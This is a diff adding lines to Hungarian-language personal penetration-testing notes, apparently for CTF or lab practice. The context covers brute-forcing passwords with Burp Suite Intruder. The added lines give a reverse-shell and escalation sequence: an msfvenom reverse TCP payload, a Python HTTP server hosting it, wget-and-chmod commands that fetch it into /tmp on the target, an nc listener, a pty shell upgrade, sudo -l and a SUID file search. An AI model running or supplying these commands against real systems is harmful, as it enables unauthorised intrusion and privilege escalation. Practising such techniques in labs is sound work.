@@ -399,6 +399,19 @@ intrudernél kijelölni a jelszót add $
 utána payloads fül és bemásolom a jelszavakat
 ha valahol a Length nagyon különböző akkor az lesz a jó.
 ((MEGJEGYZÉS: Lehet több burpsuiteot és feldarabolni a txt fájlt több kisebb részre pl 150 jelszó esetén 50-50-50))
+Utána ha meg van, akkor a burpsuite-ot bezárni, foxyproxyt kikapcsoolni
+
+Az oldalon lehet felületi shell (command shell)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=SAJATIP LPORT=4444 elf > shell.elf
+python3 -m http.server
+cd /tmp;rm -rf shell.elf;wget http://IP:8000/shell.elf;chmod 777 shell.elf;ls -l /tmp
+
+érdemes szétnézni /home ls userek
+nc -lvnp 4444 listener készítése
+utána a felületi shellen /tmp/shell.elf
+a terminálon python3 -c "import pty;pty.spawn('/bin/bash')"
+sudo -l mihez van jogom
+find / -perm -u=s 2>/dev/null itt nézni van-e eltérés (itt a find)
 
 
 
